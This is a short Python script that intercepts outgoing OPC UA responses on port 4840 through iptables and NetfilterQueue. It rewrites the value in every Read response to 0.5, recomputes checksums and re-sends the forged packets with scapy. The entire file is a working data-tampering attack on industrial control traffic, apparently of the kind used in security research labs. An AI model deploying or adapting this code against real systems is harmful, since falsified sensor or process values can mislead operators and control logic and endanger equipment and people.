from packet_interpreter import extract_packet_data
from netfilterqueue import NetfilterQueue
from subprocess import DEVNULL, STDOUT, call
from opcua_data_class import OpcuaData
from scapy.layers.inet import IP, TCP
from scapy.all import send, Raw
import struct


def alter_payload(opcua_data: OpcuaData):
    payload = opcua_data.payload
    # print(payload)
    new_value = 0.5
    new_value_hex = str(hex(struct.unpack('L', struct.pack('>d', new_value))[0])[2:].zfill(16))
    new_payload = payload[:opcua_data.start] + new_value_hex + payload[opcua_data.end:]
    return bytes.fromhex(new_payload)


def alter_and_drop(pkt):
    pkt.retain()
    pl = IP(pkt.get_payload())
    if pl.haslayer("IP") and pl.haslayer("TCP"):
        opcua_data = extract_packet_data(pl)
        print(opcua_data.__str__())
        if opcua_data.rsp_type == "Read":
            new_payload = alter_payload(opcua_data)
            pl[Raw].load = new_payload
            del pl[TCP].chksum
            del pl[IP].chksum
            pkt.drop()
            pl.show2()
            send(pl)
        else:
            pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, alter_and_drop)
try:
    call(['sudo iptables -D OUTPUT -p tcp -m tcp --sport 4840 -j NFQUEUE --queue-num 1'],
         shell=True, stdout=DEVNULL, stderr=STDOUT)
    call(['sudo iptables -I OUTPUT -p tcp -m tcp --sport 4840 -j NFQUEUE --queue-num 1'],
         shell=True, stdout=DEVNULL, stderr=STDOUT)
    nfqueue.run()
except (Exception, KeyboardInterrupt) as e:
    call(['sudo iptables -D OUTPUT -p tcp -m tcp --sport 4840 -j NFQUEUE --queue-num 1'],
         shell=True, stdout=DEVNULL, stderr=STDOUT)
    print(e)
    nfqueue.unbind()
